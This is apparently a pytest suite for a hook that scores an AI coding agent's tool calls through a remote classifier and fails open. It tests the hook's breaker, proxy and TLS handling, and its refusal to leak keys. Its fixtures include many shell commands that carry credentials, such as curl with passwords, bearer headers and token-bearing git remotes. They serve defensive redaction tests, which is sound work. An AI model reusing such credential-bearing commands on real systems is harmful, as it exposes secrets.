    flat = " ".join(section.split())
    for stated in ("probability of 0.8", "2.5 seconds", "2,000 characters", "200 characters", "64 KiB",
                   "three failed requests", "ten minutes", "`ENFORCE = False`", "`SEND = False`",
                   "any nesting up to 8", "nesting past 8", "fourteen wrapping commands",
                   "over 64 characters", "128 distinct names"):
        assert stated in flat, stated


def test_needs_human_at_threshold_asks(stub, enforce):
    stub.answer(0.0, jev.CONFIDENCE)
    assert decision(go(stub)) == "ask"


def test_a_shadow_deny_does_not_grant_a_repeat_pass(stub, project, monkeypatch):
    """A row written in shadow mode must not let the call through once ENFORCE flips."""
    stub.answer(0.95, 0.0)
    assert go(stub) is None and ledger(project)[-1]["decision"] == "deny"
    monkeypatch.setattr(jev, "ENFORCE", True)
    assert decision(go(stub)) == "deny"
    assert len(stub.requests) == 2


def test_better_tool_at_threshold_denies(stub, project, enforce):
    stub.answer(jev.CONFIDENCE, 0.0)
    assert decision(go(stub)) == "deny"
    assert ledger(project)[-1]["decision"] == "deny"


def test_just_below_threshold_prints_nothing(stub, enforce):
    stub.answer(jev.CONFIDENCE - 0.001, jev.CONFIDENCE - 0.001)
    assert go(stub) is None


def test_needs_human_asks_and_wins_over_better_tool(stub, enforce):
    stub.answer(0.99, 0.95)
    assert decision(go(stub)) == "ask"


@pytest.mark.parametrize("better_tool", [0.0, 0.5, 0.8, 1.0])
@pytest.mark.parametrize("needs_human", [0.0, 0.5, 0.8, 1.0])
def test_it_never_prints_allow(stub, enforce, better_tool, needs_human):
    stub.answer(better_tool, needs_human)
    out = go(stub, payload(command="echo %s %s" % (better_tool, needs_human)))
    assert out is None or decision(out) in ("deny", "ask")


def test_shadow_mode_records_and_prints_nothing(stub, project):
    stub.answer(0.95, 0.0)
    assert go(stub) is None
    row = ledger(project)[-1]
    assert row["decision"] == "deny" and row["enforced"] is False


def test_an_identical_call_is_denied_once_and_then_not_sent(stub, project, enforce):
    stub.answer(0.95, 0.0)
    assert go(stub) is not None
    sent = len(stub.requests)
    assert go(stub) is None
    assert len(stub.requests) == sent, "the repeat pass must not call Jev again"
    assert ledger(project)[-1]["outcome"] == "repeat_pass"
    assert go(stub, payload(session="s2")) is not None


def test_a_deny_is_not_printed_when_its_row_cannot_be_written(stub, monkeypatch, enforce):
    stub.answer(0.95, 0.0)
    monkeypatch.setattr(jev, "write_row", lambda row: False)
    for _ in range(3):
        assert go(stub) is None


def test_write_row_is_true_only_when_the_row_is_on_disk(project, monkeypatch):
    assert jev.write_row({"probe": 1}) is True
    assert ledger(project)[-1] == {"probe": 1}
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", "/dev/null")
    assert jev.write_row({"probe": 2}) is False


def test_an_unwritable_ledger_prints_no_deny_through_the_real_writer(stub, monkeypatch, enforce):
    stub.answer(0.95, 0.0)
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", "/dev/null")
    for _ in range(3):
        assert go(stub) is None


def test_the_repeat_pass_reads_only_the_ledger_tail(stub, project, enforce):
    stub.answer(0.95, 0.0)
    go(stub)
    path = project / ".claude" / "ledger" / "jev-route.jsonl"
    deny = path.read_text()
    path.write_text('{"pad": "%s"}\n' % ("x" * 200) * 40000 + deny)
    started = time.monotonic()
    assert go(stub) is None
    assert ledger(project)[-1]["outcome"] == "repeat_pass"
    assert time.monotonic() - started < 0.5


# ------------------------------------------------------------ fails open


def test_send_off_makes_no_request_opens_no_socket_and_writes_an_off_row(stub, project, monkeypatch):
    """SEND gates every request. The stub is there so that a request would be seen,
    and the socket is poisoned so that even one that reached no stub would be."""
    monkeypatch.setattr(jev, "SEND", False)
    monkeypatch.setattr(jev, "ENFORCE", True)
    touched = []

    def refuse(*args, **kwargs):
        touched.append(args)
        raise AssertionError("a request was made while SEND is off")

    calls = (payload(), payload(tool="Write", tool_input={"file_path": "/repo/a.txt", "content": "x"}),
             payload(tool="mcp__x__y", tool_input={"a": 1}))
    for p in calls:
        with monkeypatch.context() as poisoned:
            poisoned.setattr(socket.socket, "__init__", refuse)
            poisoned.setattr(socket, "create_connection", refuse)
            poisoned.setattr(socket, "getaddrinfo", refuse)
            poisoned.setattr(jev, "ask_within", refuse)
            poisoned.setattr(jev, "ask_jev", refuse)
            assert go(stub, p) is None
    assert touched == [] and stub.requests == []
    rows = ledger(project)
    assert [row["outcome"] for row in rows] == ["off"] * 3
    for row in rows:
        assert row["decision"] == "none" and row["enforced"] is True and "latency_ms" not in row


def test_a_401_from_the_api_is_an_error_row_prints_nothing_and_opens_the_breaker(stub, project, enforce, monkeypatch):
    """The proxy adds the key. One that does not gets a 401, and the hook, which
    holds no key to blame, fails open: the call runs as it would without the hook,
    and three in a row stop the requests for ten minutes."""
    stub.reply = (401, {"detail": "Not authenticated"})
    for _ in range(jev.BREAKER_ERRORS):
        rc, out = run_main(monkeypatch, json.dumps(payload()), stub.url)
        assert rc == 0 and out == ""
    rows = ledger(project)
    assert [(r["outcome"], r["error"], r["decision"]) for r in rows] == [("error", "HTTP 401", "none")] * 3
    assert len(stub.requests) == 3
    rc, out = run_main(monkeypatch, json.dumps(payload()), stub.url)
    assert rc == 0 and out == ""
    assert ledger(project)[-1]["outcome"] == "breaker_open" and len(stub.requests) == 3


@pytest.mark.parametrize("reply", [
    (500, {"error": "boom"}),
    (422, {"detail": []}),
    (403, {"detail": {"error_type": "authentication_error"}}),
    (200, b"not json"),
    (200, {"model": "gpt-x", "answers": {"better_tool": {"type": "noul", "noul": 0.99}, "needs_human": {"type": "noul", "noul": 0.1}}}),
    (200, {"model": "jev-1.14.0", "answers": {"better_tool": {"type": "noul", "noul": 7}, "needs_human": {"type": "noul", "noul": 0.1}}}),
    (200, {"model": "jev-1.14.0", "answers": {"better_tool": {"type": "noul", "noul": True}, "needs_human": {"type": "noul", "noul": 0.1}}}),
    (200, {"model": "jev-1.14.0", "answers": {"better_tool": {"type": "choice", "choice": "x", "confidence": 0.99}, "needs_human": {"type": "noul", "noul": 0.1}}}),
    (200, {"model": "jev-1.14.0", "answers": {"better_tool": {"type": "noul", "noul": 0.99}}}),
])
def test_a_bad_answer_prints_nothing_and_is_recorded(stub, project, enforce, reply):
    stub.reply = reply
    assert go(stub) is None
    assert ledger(project)[-1]["outcome"] == "error"


def test_an_http_error_is_recorded_by_code(stub, project, enforce):
    stub.reply = (503, {"error": "down"})
    assert go(stub) is None
    assert ledger(project)[-1]["error"] == "HTTP 503"


def test_a_slow_answer_is_cut_at_the_deadline(stub, project, enforce):
    stub.answer(0.99, 0.0)
    stub.delay = 2.0
    started = time.monotonic()
    assert go(stub, timeout=0.3) is None
    assert time.monotonic() - started < 1.0
    assert ledger(project)[-1]["outcome"] == "error"


def test_a_trickling_server_is_cut_at_the_deadline(project, enforce):
    """One byte at a time resets a socket timeout forever; the deadline does not."""
    listener = socket.socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen(1)
    port = listener.getsockname()[1]

    def trickle():
        conn, _ = listener.accept()
        conn.recv(65536)
        try:
            for ch in b"HTTP/1.1 200 OK\r\nContent-Length: 1000\r\n\r\n" + b"x" * 100:
                conn.send(bytes([ch]))
                time.sleep(0.05)
        except OSError:
            pass
        conn.close()

    threading.Thread(target=trickle, daemon=True).start()
    started = time.monotonic()
    out = jev.run(payload(), endpoint="http://127.0.0.1:%d/v1/systemone" % port, now=NOW, timeout=0.5)
    assert out is None
    assert time.monotonic() - started < 1.5
    assert ledger(project)[-1]["outcome"] == "error"
    listener.close()


def test_a_dead_host_fails_open(project):
    assert jev.run(payload(), endpoint=DEAD, now=NOW, timeout=0.5) is None
    assert ledger(project)[-1]["outcome"] == "error"


def test_a_redirect_is_refused_and_the_request_does_not_follow(stub, project, enforce):
    target = Stub()
    try:
        target.answer(0.99, 0.0)
        stub.redirect_to = target.url.replace("/v1/systemone", "/elsewhere")
        assert go(stub) is None
        assert target.requests == [], "the request followed a redirect"
        assert ledger(project)[-1]["error"] == "HTTP 302"
    finally:
        target.server.shutdown()


@pytest.mark.parametrize("url", [
    "http://api.typesafe.ai/v1/systemone",
    "https://user:pw@api.typesafe.ai/v1/systemone",
    "https://api.typesafe.ai/v1/systemone?x=1",
    "ftp://api.typesafe.ai/",
])
def test_an_unsafe_endpoint_is_refused_before_any_send(url):
    assert jev.run(payload(), endpoint=url, now=NOW) is None


def test_a_refused_endpoint_is_recorded(project):
    jev.run(payload(), endpoint="http://api.typesafe.ai/v1/systemone", now=NOW)
    assert ledger(project)[-1]["error"] == "endpoint refused"


def test_three_failed_requests_open_the_breaker_for_ten_minutes(project):
    for _ in range(jev.BREAKER_ERRORS):
        jev.run(payload(), endpoint=DEAD, now=NOW, timeout=0.5)
    assert [r["outcome"] for r in ledger(project)] == ["error"] * jev.BREAKER_ERRORS
    started = time.monotonic()
    jev.run(payload(), endpoint=DEAD, now=NOW, timeout=0.5)
    assert ledger(project)[-1]["outcome"] == "breaker_open"
    assert "latency_ms" not in ledger(project)[-1]
    assert time.monotonic() - started < 0.4
    nine = NOW + timedelta(seconds=jev.BREAKER_S - 1)
    jev.run(payload(), endpoint=DEAD, now=nine, timeout=0.5)
    assert ledger(project)[-1]["outcome"] == "breaker_open"
    later = NOW + timedelta(seconds=jev.BREAKER_S)
    jev.run(payload(), endpoint=DEAD, now=later, timeout=0.5)
    assert ledger(project)[-1]["outcome"] == "error", "the breaker must let one request through after BREAKER_S"


def test_two_failures_do_not_open_the_breaker(project):
    for _ in range(jev.BREAKER_ERRORS - 1):
        jev.run(payload(), endpoint=DEAD, now=NOW, timeout=0.5)
    jev.run(payload(), endpoint=DEAD, now=NOW, timeout=0.5)
    assert ledger(project)[-1]["outcome"] == "error"
    assert len(ledger(project)) == 3


def test_an_answer_closes_the_breaker(stub, project):
    for _ in range(jev.BREAKER_ERRORS - 1):
        jev.run(payload(), endpoint=DEAD, now=NOW, timeout=0.5)
    go(stub)
    jev.run(payload(), endpoint=DEAD, now=NOW, timeout=0.5)
    go(stub)
    assert ledger(project)[-1]["outcome"] == "answered"


def test_each_call_leaves_exactly_one_row(stub, project, monkeypatch):
    def switched_off():
        with monkeypatch.context() as off:
            off.setattr(jev, "SEND", False)
            go(stub)

    calls = [
        lambda: go(stub),
        switched_off,
        lambda: go(stub, payload(tool="Not A Tool;")),
        lambda: go(stub, endpoint="http://api.typesafe.ai/v1/x"),
        lambda: go(stub, "not a payload"),
        lambda: go(stub, payload(tool="mcp__x__y", tool_input={"a": 1})),
        lambda: go(stub, payload(tool="Write", tool_input=None)),
    ]
    for n, call in enumerate(calls, 1):
        call()
        assert len(ledger(project)) == n, n


def test_the_shipped_endpoint_and_model():
    assert jev.ENDPOINT == "https://api.typesafe.ai/v1/systemone" and jev.endpoint_ok(jev.ENDPOINT)
    assert jev.MODEL.startswith("jev-")


# ------------------- no key in the hook, and the request goes through the proxy

SECRET = "tsk_live_abcDEF123456xyz"
# What a request from this hook may carry. urllib adds the first six itself.
ALLOWED_HEADERS = {"host", "content-type", "content-length", "user-agent", "accept-encoding", "connection"}


def make_certificate(directory, name):
    """A self-signed certificate for api.typesafe.ai and its key, made by the
    openssl binary. It is a test fixture and trusts nothing: only a test that
    names it in SSL_CERT_FILE trusts it."""
    openssl = shutil.which("openssl", path=ORIGINAL_PATH)
    if openssl is None:
        pytest.skip("no openssl binary to make a certificate with")
    cert, key = directory / (name + ".crt"), directory / (name + ".key")
    subprocess.run([openssl, "req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1", "-nodes",
                    "-keyout", str(key), "-out", str(cert), "-days", "2", "-subj", "/CN=api.typesafe.ai",
                    "-addext", "subjectAltName=DNS:api.typesafe.ai"], check=True, capture_output=True, timeout=30)
    return cert, key


@pytest.fixture(scope="session")
def certificates(tmp_path_factory):
    directory = tmp_path_factory.mktemp("certificates")
    return make_certificate(directory, "api"), make_certificate(directory, "stranger")


def serve_with(cert_and_key):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(*map(str, cert_and_key))
    return context


def test_the_request_has_no_authorization_header_and_the_body_is_the_outline_only(stub, project, monkeypatch):
    """The key is the proxy's. A value in the environment is not read, whatever
    it is called, by run() or by main()."""
    for name in ("TYPESAFE_API_KEY", "TYPESAFE_KEY"):
        monkeypatch.setenv(name, SECRET)
    command = "curl -u admin:hunter2 https://x.example"
    go(stub, payload(command=command))
    rc, _ = run_main(monkeypatch, json.dumps(payload(command=command)), stub.url)
    assert rc == 0 and len(stub.requests) == 2
    for sent in stub.requests:
        names = {name.lower() for name in sent["headers"]}
        assert not names & {"authorization", "proxy-authorization", "cookie", "x-api-key"}, names
        assert names <= ALLOWED_HEADERS, names
        assert SECRET not in json.dumps(sent["headers"])
        assert sent["body"] == {"model": jev.MODEL, "state": {"tool_name": "Bash", "tool_input": "curl -u"},
                                "questions": jev.QUESTIONS}
        for fragment in ("hunter2", "admin", "x.example", SECRET):
            assert fragment not in json.dumps(sent["body"])
    assert SECRET not in (project / ".claude" / "ledger" / "jev-route.jsonl").read_text()


def test_an_error_carrying_a_secret_in_its_text_is_never_written(project, monkeypatch, capsys):
    def leaky(body, endpoint, deadline):
        raise ValueError("Invalid header value b'%s'" % SECRET)
    monkeypatch.setattr(jev, "ask_within", leaky)
    jev.run(payload(), endpoint=DEAD, now=NOW)
    row = ledger(project)[-1]
    assert row["outcome"] == "error" and row["error"] == "ValueError"
    assert "tsk_live" not in (project / ".claude" / "ledger" / "jev-route.jsonl").read_text()
    assert "tsk_live" not in capsys.readouterr().err


def test_a_crash_carrying_a_secret_leaves_a_row_with_the_class_name_only(stub, project, monkeypatch, capsys):
    def boom(*a, **k):
        raise RuntimeError(SECRET)
    monkeypatch.setattr(jev, "run", boom)
    run_main(monkeypatch, json.dumps(payload()), stub.url)
    row = ledger(project)[-1]
    assert row["outcome"] == "crash" and row["error"] == "RuntimeError"
    assert "tsk_live" not in (project / ".claude" / "ledger" / "jev-route.jsonl").read_text()
    assert "tsk_live" not in capsys.readouterr().err


def test_main_reads_only_the_project_dir_and_path_from_the_environment():
    """PATH is how the hook tells a command from a word. It is read to look for a
    file and is never sent, and the lookups run nothing. No variable holds a key:
    the proxy and the certificates are read by urllib and ssl, not by this file."""
    source = HOOK.read_text()
    reads = set(re.findall(r"""(?:environ\.get|getenv)\(\s*["']([A-Za-z_]+)["']""", source))
    assert reads == {"CLAUDE_PROJECT_DIR", "PATH"}
    assert "os.environ[" not in source and "environ.copy" not in source and "dict(os.environ" not in source
    assert "TYPESAFE_API_KEY" not in source and "Bearer" not in source and "KEY_SHAPE" not in source


def test_the_request_goes_through_the_proxy_the_environment_sets(project, monkeypatch, fake_proxy):
    """With HTTPS_PROXY at a fake proxy the CONNECT for api.typesafe.ai reaches it.
    The fake proxy refuses the tunnel, so nothing goes further, and the loopback
    guard fails the test if the request tried to go around the proxy."""
    proxy = fake_proxy()
    route_through(monkeypatch, proxy)
    assert jev.ENDPOINT == "https://api.typesafe.ai/v1/systemone"
    assert jev.run(payload(), now=NOW, timeout=5) is None
    assert proxy.connects() == ["CONNECT api.typesafe.ai:443 HTTP/1.1"]
    assert proxy.tunnelled == []
    assert ledger(project)[-1]["outcome"] == "error"


def test_the_proxy_is_read_when_the_request_is_made_and_a_redirect_is_still_refused(monkeypatch, fake_proxy):
    """The opener is built for each request, so a proxy set after the module was
    loaded is the one used, and the one handler that is not the default refuses
    redirects."""
    first, second = fake_proxy(), fake_proxy()
    route_through(monkeypatch, first)
    assert jev.run(payload(), now=NOW, timeout=5) is None
    route_through(monkeypatch, second)
    assert jev.run(payload(), now=NOW + timedelta(seconds=1), timeout=5) is None
    assert (len(first.heads), len(second.heads)) == (1, 1)
    handlers = jev.opener().handlers
    assert sum(isinstance(h, jev.urllib.request.HTTPRedirectHandler) for h in handlers) == 1
    assert any(isinstance(h, jev._NoRedirect) for h in handlers)
    assert any(isinstance(h, jev.urllib.request.ProxyHandler) and h.proxies.get("https") == second.url
               for h in handlers)


def test_the_tunnel_trusts_ssl_cert_file_and_carries_no_credential(project, monkeypatch, fake_proxy, certificates):
    """The whole path with loopback standing in for the world: CONNECT through the
    proxy, TLS to a certificate the environment names in SSL_CERT_FILE, the
    request read inside the tunnel, the answer read back."""
    (cert, key), _ = certificates
    proxy = fake_proxy(tls=serve_with((cert, key)))
    route_through(monkeypatch, proxy)
    monkeypatch.setenv("SSL_CERT_FILE", str(cert))
    assert jev.run(payload(command="curl -u admin:hunter2 https://x.example"), now=NOW, timeout=5) is None
    assert proxy.connects() == ["CONNECT api.typesafe.ai:443 HTTP/1.1"]
    assert len(proxy.tunnelled) == 1
    request = proxy.tunnelled[0]
    assert request["line"] == "POST /v1/systemone HTTP/1.1"
    assert request["headers"]["host"] == "api.typesafe.ai"
    assert not set(request["headers"]) & {"authorization", "proxy-authorization", "x-api-key"}
    assert set(request["headers"]) <= ALLOWED_HEADERS
    assert request["body"]["state"] == {"tool_name": "Bash", "tool_input": "curl -u"}
    row = ledger(project)[-1]
    assert row["outcome"] == "answered" and row["better_tool"] == 0.1


def test_a_certificate_the_environment_does_not_trust_is_refused_through_the_proxy(
        project, monkeypatch, fake_proxy, certificates):
    """The trust is the environment's. Name another certificate in SSL_CERT_FILE and
    the same tunnel is refused before any request is written into it."""
    (cert, key), (stranger, _) = certificates
    proxy = fake_proxy(tls=serve_with((cert, key)))
    route_through(monkeypatch, proxy)
    monkeypatch.setenv("SSL_CERT_FILE", str(stranger))
    assert jev.run(payload(), now=NOW, timeout=5) is None
    assert proxy.connects() == ["CONNECT api.typesafe.ai:443 HTTP/1.1"]
    assert proxy.tunnelled == []
    assert ledger(project)[-1]["outcome"] == "error"


def test_a_real_process_reaches_the_proxy_with_send_on_and_never_as_shipped(project, fake_proxy):
    """The shipped file, run as the harness runs it, opens no connection at all: the
    fake proxy sees none. The same environment with SEND switched on by a driver
    reaches it, so the zero is not an environment that never could."""
    proxy = fake_proxy()
    stdin_text = json.dumps(payload())
    proc, _ = run_in_a_process(project, jev.ENDPOINT, stdin_text, extra_env=proxy_env(proxy))
    assert proc.returncode == 0 and proc.stdout == "", proc.stderr
    assert proxy.connects() == ["CONNECT api.typesafe.ai:443 HTTP/1.1"]
    assert ledger(project)[-1]["outcome"] == "error"
    shipped = run_the_shipped_file(project, stdin_text, proxy_env(proxy))
    assert shipped.returncode == 0 and shipped.stdout == "" and shipped.stderr == ""
    assert proxy.connects() == ["CONNECT api.typesafe.ai:443 HTTP/1.1"], "the shipped file made a connection"
    assert ledger(project)[-1]["outcome"] == "off"


# ------------------------------------------- what leaves: the allowed pieces

# Two canaries. Both fit the character class. The first has two digits, which a
# program name may carry, so it is only kept out by reading the command right.
# The second has five, which the digit rule alone would drop, so it also covers
# the rules that do not depend on it.
CANARIES = ("Zq81nTwUvaBcDe", "Zq81nT0wUv44aB")

# Each way a value can sit in a command. A canary fits the character class, so
# if any of these were read as a program, a flag or a path it would leave.
VALUE_PLACES = [
    "curl -u admin:{s} https://x.example",
    "curl --user admin:{s}",
    "curl --user={s}",
    "curl -u {s}",
    "curl -H 'Authorization: Bearer {s}'",
    "curl -H \"Cookie: session={s}\"",
    "curl -H {s}",
    "curl --header {s}",
    "mysql -p{s}",
    "mysql -u root -p{s}",
    "mysql --password={s}",
    "mysql --password {s}",
    "TOKEN={s} run.sh",
    "TOKEN={s} PASSWORD=x run.sh",
    "export TOKEN={s}",
    "env TOKEN={s} printenv",
    "env -i TOKEN={s} printenv",
    "echo {s}",
    "echo '{s}'",
    "echo \"{s}\"",
    "echo hi {s} there",
    "echo {s} > out.txt",
    "echo {s} >> out.txt",
    "echo {s} 2>&1",
    "cat <<< {s}",
    "cat <<<{s}",
    "cat <<EOF\n{s}\nEOF",
    "cat <<'EOF'\n{s}\nEOF",
    "cat <<\"EOF\"\n{s}\nEOF",
    "cat <<-EOF\n\t{s}\n\tEOF",
    "cat <<EOF | sh\n{s}\nEOF",
    "cat > .env <<'EOF'\nTOKEN={s}\n{s}\nEOF\nls",
    "cat <<EOF\n{s}",
    "echo hi # {s}",
    "echo hi\n# {s}\nls",
    "echo $(echo {s})",
    "echo `echo {s}`",
    "git commit -m {s}",
    "git commit -m '{s}'",
    "git remote add origin https://x:{s}@github.com/a/b",
    "aws configure set aws_secret_access_key {s}",
    "gh auth login --with-token <<< {s}",
    "python3 -c 'print(\"{s}\")'",
    "bash -c \"echo {s}\"",
    "docker login -u user -p {s}",
    "sudo -u {s} ls",
    "sudo -p {s} ls",
    "timeout {s} ls",
    "ssh -i key {s}@host",
    "x={s}; echo $x",
    "printf '%s' {s} | sha256sum",
    "read -s {s}",
    "{s}=1 true",
    "for {s} in a b; do echo; done",
    "case {s} in a) true;; esac",
    "[ -n {s} ]",
    "echo a\\ {s}",
    "echo a\\\n{s}",
    "ls -- {s}",
    "xargs -I {s} ls",
    "find . -name {s}",
    "grep -e {s} file",
    "sed -i s/{s}/x/ file",
    "echo $'{s}'",
    "echo ${{X:-{s}}}",
    "echo \"$(echo {s})\"",
    "(echo {s})",
    "{{ echo {s}; }}",
    "echo {s} &",
    "echo {s} | cat",
    "echo {s} && echo {s} || echo {s}",
    # Syntax the reader once guessed at. Each row below sent the value as a
    # program name, a flag name or a path before the reader stopped guessing.
    # An array literal.
    "KEYS=({s} other)",
    "KEYS=(other {s})",
    "KEYS=(\"a b\" {s})",
    "KEYS=($(echo a) {s})",
    "A+=({s})",
    "A=({s}) echo hi",
    "declare -a KEYS=({s} other)",
    "declare -A M=([a]={s} [b]=c)",
    "PASSWORDS=({s} x) deploy.sh",
    # A subscripted assignment is a variable, not a program with a path in it.
    "A[0]=x/{s}",
    "A[$i]=x/{s}",
    "arr=(a b); arr[1]=http://h/{s}",
    # case, [[ ]] and arithmetic: a pattern, an operand or a name, never a command.
    "case $1 in start|{s}) echo hi;; esac",
    "case x in ({s}) true;; esac",
    "[[ $x =~ ^({s}|b)$ ]] && echo yes",
    "[[ x > {s} ]]",
    "[[ x < {s} ]]",
    "[[ x == @({s}|b) ]]",
    "[[ ( -n x ) && {s} == y ]]",
    "[[ a =~ x\\ ]]|{s} ]] && ls",
    "[[ a =~ \"x ]]\"|{s} ]] && ls",
    "time [[ x > {s} ]]",
    "! [[ x < {s} ]]",
    "time (( {s} > 1 ))",
    # A list that never closes is not known to be a list, so nothing in it is sent.
    "echo \"$(echo a; {s}",
    "echo $(echo a; {s}",
    "echo `echo a; {s}",
    "echo $(echo a; {s} 'unclosed)",
    "echo \"`echo a$(`; {s}",
    "[[ \"a b\" == '{s}' ]]; echo done",
    "echo $(({s} + 1))",
    "echo $(( ({s}) ))",
    "echo $(({s}<<2))",
    "(( {s} = 1 << 3 ))\nls",
    "((i++)); echo {s}",
    "for (({s}=0; {s}<3; {s}++)); do echo; done",
    "x=$(({s}<<2))\ngit push",
    # A separator inside a parameter expansion or an ANSI-C string.
    "echo ${{X:-a b;{s} c}}",
    "echo ${{X:+a|{s}}}",
    "echo ${{X:-({s})}}",
    "echo $'pre\\'; {s} --secret-flag \\'post'",
    "echo $'a\\'b' {s}",
    # Quotes nested inside a substitution inside a double quoted string.
    "git commit -m \"$(cat <<'EOF'\nFix the 5\" pipe handling\n\nRotated the credential for staging\n{s} is the new value\nEOF\n)\"",
    "git commit -m \"$(cat <<'EOF'\nFix a \"bug\nsecond line {s} here\nEOF\n)\"",
    "gh pr create --body \"$(cat <<EOF\nit's \"odd\n{s}\nEOF\n)\"",
    "echo \"$(echo \"\n{s} x x \")\"",
    "echo \"$(echo 'x\"; {s} ')\"",
    "echo \"x $(echo \"a;\n{s}\n\") y\"",
    "curl -d \"$(printf '%s' \"user\n{s}\n\")\" https://x",
    "echo \"`echo \"a;{s}\"`\"",
    "echo \"$(echo \"$(echo \"a; {s}\")\")\"",
    # A quoted string after a wrapper is one word, and its tail is not a program.
    "watch \"curl https://h/api/{s}\"",
    "time \"echo x/{s}\"",
    "sudo \"A B=x/{s}\"",
    "env \"A B={s}/x\" true",
    "xargs \"echo a/{s}\"",
    "command \"x y/{s}\"",
    "exec \"a:b/{s}\"",
    # A word after a substitution or a subshell is an argument, not a new command.
    "echo $(whoami) {s}",
    "echo `whoami` {s}",
    "echo $(whoami){s} x",
    "echo a$(whoami){s}",
    "echo \"$(date)\" {s}",
    "sudo $(which foo) {s}",
    "cat <(echo a) {s}",
    "cat <(echo a){s}",
    "(echo a) {s}",
    "(echo a){s}",
    "{s}$(date) foo",
    # A quoted string that starts with a dash is a value, not a flag.
    "git commit -m '--{s}'",
    "echo \"--{s}\"",
    "ls '--{s}'=auto",
    # A word after the target of &> or &>> is an argument. The & was read as a
    # separator before the > was seen, so the word became a program.
    "echo a &>/dev/null {s}",
    "echo a &>>log.txt {s}",
    "echo a &> out.log {s} correcthorsebatterystaple",
    "ls &>out.log {s}",
    "{{ echo a; }} && echo b &>/dev/null {s}",
    # An assignment or a reserved word is one only when it is typed bare. Quoted or
    # escaped it is a command name, and the next word is its argument.
    "\"FOO=bar\" {s}",
    "\\FOO=bar {s}",
    "FOO\"=\"bar {s}",
    "F\\OO=bar {s}",
    "\"if\" {s}",
    "\"then\" {s}",
    "\"{{\" {s}",
    "\"!\" {s}",
    "\"fi\" {s}",
    "\\done {s}",
    "false || \\ex=cho {s}",
    "(ex=cho a\\= {s})",
    "time \"A=1\" {s}",
    # Nothing read ahead of a command makes the reserved word after it one: after
    # an assignment or a redirect, if and then are command names.
    "FOO=bar if {s}",
    "x= if {s} echo",
    "A=1 then {s}",
    "A=1 do {s}",
    "A=1 while {s}",
    "A=1 ! {s}",
    "A=1 {{ {s}",
    "> out.txt if {s}",
    "2>/dev/null then {s}",
    "<in.txt do {s}",
    "2>&1 if {s}",
    "> out.txt {{ {s}",
    "A=1 ({s})",
    "> out.txt ({s})",
    # Bash keeps a carriage return inside the word, so this is one assignment.
    "FOO=bar\r{s}",
    "A=1\rB=2\r{s}",
    "\r{s}",
    "ls && \r{s}",
    "sudo \r{s}",
    # Bash joins a line continuation before it reads an operator, so the two
    # halves of one operator are not two operators.
    "cat <\\\n<EOF\n{s}\nEOF",
    "cat <\\\n<EOF\n{s}\nEOF\nls",
    "cat <<\\\n<{s}",
    "echo a >\\\n&{s} x",
    "echo a &\\\n>/dev/null {s}",
    "echo $\\\n{{X:-a;{s} }}",
    # The legacy $[ ] arithmetic is not a command list and holds a ; or a newline.
    "echo $[ 1 ; {s} ]",
    "echo $[ 1\n{s} ]",
    "echo \"$[ 1 \"; {s} ]\"",
    "x=$[ 1 ; {s} ]",
    # A quoted string that never closes is not known to be a word, whether the
    # command is malformed or a 64 KiB cut opened the quote.
    "'{s}",
    "\"{s}",
    "sudo '{s}",
    "echo hi; '{s}",
    "time \"{s}",
    "echo hi; ls | \\{s}\\",
    "echo hi; \"{s}\\\n",
    # A bare delimiter means an expanded body, and bash removes a backslash-newline
    # from it before it compares a line with the delimiter: foo\ then EOF is the one
    # line fooEOF and the body goes on, so the lines after it are text. A line that
    # ends in an odd number of backslashes joins, an even number does not.
    "cat <<EOF\nline one\\\nEOF\n{s} --token abc\nEOF\nls",
    "cat <<EOF\nline one\\\nEOF\n{s}\nEOF",
    "cat <<EOF\nfoo\\\\\\\nEOF\n{s} two\nEOF",
    "cat <<EOF\nfoo\\\n\\\nEOF\n{s} two\nEOF",
    "cat <<-EOF\n\tfoo\\\n\tEOF\n{s} two\n\tEOF",
    # A delimiter is literal text. Bash expands nothing in it and runs nothing in
    # it, so a $ in it is not a resolved word, and $(cmd) in it is not a command.
    "cat <<$'EOF'\n$\n{s} --token abc\nEOF",
    "cat <<$\"EOF\"\n$\n{s} --token abc\nEOF",
    "cat <<${{X}}\n$\n{s} --token abc\n${{X}}",
    "cat <<$X\n$\n{s} --token abc\n$X",
    "cat <<$(echo)\n$\n{s} --token abc\n$(echo)\nend",
    "cat <<$({s})\n$\nx\n$({s})\nend",
    "cat <<`{s}`\n$\nx\n`{s}`\nend",
    # Whether [[ and case are read does not depend on where the reader thinks a
    # command starts. A line continuation, time -p, a function body and a coprocess
    # each hid the keyword, and then < > && || and a case pattern were commands.
    "true && \\\n[[ x < {s} ]]",
    "true && \\\n[[ x > {s} ]]",
    "true && \\\n[[ -n x && {s} == y ]]",
    "true && \\\n[[ -z x || {s} == y ]]",
    "true && \\\ncase x in a|{s}) true;; esac",
    "true && [\\\n[ x < {s} ]]",
    "function f {{ [[ x < {s} ]]; }}",
    "function f {{ [[ -n x && {s} == y ]]; }}",
    "function f {{ case x in a|{s}) true;; esac; }}",
    "time -p [[ x < {s} ]]",
    "time -p case x in a|{s}) true;; esac",
    "coproc c {{ [[ x < {s} ]]; }}",
    "coproc {{ case x in a|{s}) true;; esac; }}",
    "coproc [[ x < {s} ]]",
    # Bash joins the two halves of (( and $(( across a line continuation.
    "(\\\n(x < {s}))",
    "echo $(\\\n(3 < {s}))",
    # A line continuation is not a word, so the here-string operand after one is
    # still the operand.
    "<<< \\\n  {s}",
    "cat <<< \\\n  {s}",
    # $$ is the process id and a ( after it is text, so "$$(x y)" runs nothing. The
    # second $ was read as the start of $( ) and the program, the flag names and
    # the paths inside it were sent. Outside quotes it is a syntax error in bash.
    "echo \"pid$$({s} --token abc -u admin)\"",
    "curl -d \"password=ab$$({s} --token=abc -u admin)\" https://x.example",
    "cat \"$$({s})\"",
    "echo \"$$({s} {s})\"",
    "KEYS=(\"$$({s} x)\") ls",
    "[[ \"$$({s} x)\" == y ]] && ls",
    "echo $$({s})",
    "echo $$\\\n({s})",
    # A here-document the outer command waits for takes its body from the line
    # after the whole line, not from a newline inside a $( ), a pair of backticks
    # or a <( ), which bash parses apart. A delimiter-only line inside one is only
    # a command named after it, and the body lines after the closing parenthesis
    # are text.
    "cat <<EOF $(true\nEOF\n)\n{s} --token abc\nEOF\nls",
